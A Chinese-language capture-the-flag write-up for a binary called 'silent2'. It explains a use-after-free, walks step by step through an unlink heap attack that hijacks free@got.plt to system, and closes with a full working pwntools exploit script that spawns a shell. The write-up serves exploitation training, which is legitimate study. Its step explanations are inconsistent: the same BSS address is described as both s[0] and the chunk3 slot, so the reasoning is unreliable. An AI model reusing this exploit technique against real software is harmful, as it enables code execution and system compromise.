# 漏洞成因
## 程序关键结构体
程序在BSS段（地址`0x6020D8`）维护了一个全局指针数组 `char* s[10]`，用于存储用户通过`create`函数申请的堆块指针。
```c
// BSS段布局示例
0x6020D8: chunk0_ptr
0x6020E0: chunk1_ptr
0x6020E8: chunk2_ptr
...
```
## 漏洞定位
程序存在 **Use-After-Free (UAF)** 漏洞。
1.  `delete`函数（`sub_400AB7`）释放指定索引的堆块后，**并未将全局数组`s`中对应的指针置空**。
    ```c
    free((&s)[v1]); // 仅free，未置NULL
    ```
2.  `modify`函数（`sub_400B2F`）允许对指定索引的堆块进行写入，**写入前未检查该指针是否已被释放**。
    ```c
    v2 = strlen((&s)[v1]); // 对已释放的堆块调用strlen，行为未定义但通常可工作
    sub_4008B6((&s)[v1], v2 + 1); // 向已释放的堆块写入数据
    ```
结合以上两点，攻击者可以在释放堆块后，继续修改其内存内容，为构造**Unlink**攻击提供了条件。

# 漏洞利用过程：
本漏洞利用的核心是通过UAF构造恶意的`fake chunk`，触发`glibc`的`unlink`操作，从而修改BSS段上的全局指针数组，最终实现将`free@got.plt`劫持为`system`函数地址，并在`free`时传入`/bin/sh`参数获取shell。

- Step1-2: 进行堆布局，创建5个大小均为0x100的chunk，并在chunk2中写入字符串`/bin/sh\x00`，为后续调用`system`准备参数。
- Step3: 释放chunk3和chunk4，它们进入`fastbin`或`unsorted bin`（因大小>0x80）。
- Step4: 申请一个大小为0x210的大chunk，这会合并刚才释放的两个chunk。通过精心构造的`payload`，在此大chunk内部伪造两个相邻的`fake chunk`，为`unlink`做准备。
- Step5: 再次释放chunk4（即大chunk的后半部分），触发向后合并检查，导致`unlink`发生，成功将全局数组中`chunk3`的指针修改为指向数组自身之前的地址。
- Step6-7: 利用被篡改的指针，通过`modify`函数将`free@got.plt`地址写入`chunk3`指针所指向的位置（即BSS段），再将`system`函数地址写入`free@got.plt`，完成GOT表劫持。
- Step8: 释放存有`/bin/sh\x00`的chunk2，此时实际执行`system("/bin/sh")`，获得shell。

## Step1-2
- 堆内存`0x1dce1000`处（chunk0），内容从空变为`0x0, 0x111, 0x41414141...`。原因为`create`函数分配了0x100字节的chunk（加上chunk头，size为0x111），并写入了`AAAA`。
- 堆内存`0x1dce1110`（chunk1）、`0x1dce1220`（chunk2，写入`/bin/sh`）、`0x1dce1330`（chunk3）、`0x1dce1440`（chunk4）发生类似变化。
- BSS段内存`0x6020D8`处，内容从空变为`0x1dce1340, 0x1dce1450, 0x0...`。原因为`create`函数将分配的chunk用户数据区地址（chunk_ptr = chunk_header + 0x10）依次存入全局数组`s`。注意chunk3指针为`0x1dce1340`（`0x1dce1330+0x10`），chunk4指针为`0x1dce1450`（`0x1dce1440+0x10`）。

## Step3
- 释放chunk3和chunk4。这两个chunk被释放，但其指针在BSS段数组（`0x6020D8`）中仍保留原值，为后续UAF利用留下隐患。

## Step4
- 申请一个`0x210`大小的chunk5。由于`glibc`的分配机制，它会复用刚才释放的chunk3和chunk4的空间。
- 通过`create`向chunk5写入精心构造的`payload`，其目标是**在chunk5内部伪造两个chunk**：
    1.  第一个`fake chunk`位于payload起始，其`fd`和`bk`被设置为`0x6020C0`（`p_addr - 0x18`）和`0x6020C8`（`p_addr - 0x10`），这是为了通过`unlink`的安全检查：`fake_chunk->bk->fd == fake_chunk` 且 `fake_chunk->fd->bk == fake_chunk`。
    2.  用`A`填充剩余空间，直到偏移`0x100`处。
    3.  在偏移`0x100`处构造第二个`fake chunk`的`prev_size`（`0x100`）和`size`（`0x110`）。`size`被设置为`0x110`（即`0x210-0x100`），使得从第一个`fake chunk`头到第二个`fake chunk`尾的“空间”刚好等于`0x210`，模拟一个完整的已分配大chunk，并确保第二个`fake chunk`的`PREV_INUSE`位为0，标记前一个chunk（即第一个`fake chunk`）为空闲状态，这是触发合并的关键。

## Step5
- 再次执行`delete(4)`。由于chunk5（索引4）内部被我们伪造为两个chunk，且第二个`fake chunk`标记前一个chunk为空闲，`free`会尝试进行向后合并。
- 合并操作会触发对第一个`fake chunk`的`unlink`。`unlink`宏执行如下操作：
    ```c
    FD = fake_chunk->fd; // FD = 0x6020C0
    BK = fake_chunk->bk; // BK = 0x6020C8
    FD->bk = BK;         // *(0x6020C0 + 0x18) = 0x6020C8 -> 0x6020D8被写入0x6020C8
    BK->fd = FD;         // *(0x6020C8 + 0x10) = 0x6020C0 -> 0x6020D8被写入0x6020C0
    ```
- **关键内存变化**：BSS段`0x6020D8`（即`&s[0]`）处的内容，从`0x1dce1340`（chunk3的用户区地址）被修改为`0x6020C0`。这意味着，**现在`s[0]`（chunk0的指针）指向了BSS段中`s[-3]`的位置**（因为`0x6020D8 - 0x6020C0 = 0x18`，即3个指针大小）。这使得通过chunk0可以修改BSS段低地址处的内容。

## Step6
- 执行`modify(3, p64(free_got_plt)[0:4], '1111')`。此时`s[3]`（chunk3的指针）在Step5的`unlink`后已被修改为指向`0x6020C0`（即`&s[0] - 0x18`）。`modify`函数会向这个地址写入数据。
- **关键内存变化**：`modify`首先向`0x6020C0`写入`free_got_plt`的低4字节（`0x602018`），这覆盖了`s[0]`指针。现在`s[0]`指向了`free@got.plt`。同时，`modify`还会向`0x6020C8`（`&s[1]`）写入`1111`，但这不影响利用。

## Step7
- 执行`modify(0, p64(func_addr)[0:6], '2222')`。此时`s[0]`已被Step6修改为指向`free@got.plt`（`0x602018`）。
- **关键内存变化**：`modify`函数向`free@got.plt`（`0x602018`）写入`func_addr`（`0x4009c0`，即`system`函数的PLT地址）的低6字节，从而将`free`的GOT表项劫持为`system`函数地址。

## Step8
- 执行`delete(2)`。程序会调用`free(s[2])`，即`free(指向"/bin/sh\x00"的指针)`。
- 由于`free@got.plt`已被劫持为`system`，实际执行的是`system("/bin/sh\x00")`，成功获得shell。

# Exploit：
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./silent2')
if local:
    p = process('./silent2')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

def create(size, content):
    p.sendline('1')
    p.sendline(str(size))
    p.send(content)

def modify(idx, content1, content2):
    p.sendline('3')
    p.sendline(str(idx))
    p.send(content1)
    p.send(content2)

def delete(idx):
    p.sendline('2')
    p.sendline(str(idx))

p.recvuntil('king') # 接收banner

func_addr = 0x4009C0 # system@plt 地址
free_got_plt = 0x602018
p_addr = 0x6020D8   # BSS段中全局指针数组 s 的起始地址

# Step1-2: 堆布局
create(0x100, 'AAAA')        # chunk0
create(0x100, 'BBBB')        # chunk1
create(0x100, '/bin/sh\x00') # chunk2, 为system准备参数
create(0x100, 'DDDD')        # chunk3
create(0x100, 'EEEEE')       # chunk4

# Step3: 释放 chunk3 和 chunk4，制造UAF条件
delete(3)
delete(4)

# Step4: 构造fake chunk，准备unlink
# 构造第一个fake chunk: [prev_size=0][size=0x101][fd=p_addr-0x18][bk=p_addr-0x10]
# 其中 fd 和 bk 的设置是为了通过unlink的安全检查：P->fd->bk == P && P->bk->fd == P
# 填充至偏移0x100处，然后构造第二个fake chunk的头部：[prev_size=0x100][size=0x110]
# 第二个fake chunk的size (0x110 = 0x210-0x100) 使得从第一个fake chunk到第二个fake chunk末尾总大小为0x210
# 并且size的PREV_INUSE位为0，标记前一个chunk（即第一个fake chunk）为空闲，这是触发合并的关键。
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload) # 申请大chunk5，它会复用chunk3和chunk4的空间，并写入伪造数据

# Step5: 再次free chunk4（即大chunk5的后半部分），触发向后合并与unlink
# unlink后，s[0]（即chunk0的指针）将被修改为指向 (p_addr - 0x18)，即BSS段中s数组前方的地址。
delete(4)  # double free

# Step6: 此时s[3]指向了s[0]的地址附近(p_addr-0x18)。通过modify(3)修改s[0]的值为free@got.plt地址。
modify(3, p64(free_got_plt)[0:4], '1111')

# Step7: 现在s[0]指向free@got.plt。通过modify(0)将free的GOT表项覆盖为system函数地址。
modify(0, p64(func_addr)[0:6], '2222')

# Step8: free(chunk2) 即 free("/bin/sh")，由于GOT被劫持，实际执行system("/bin/sh")
delete(2)

p.interactive()
```
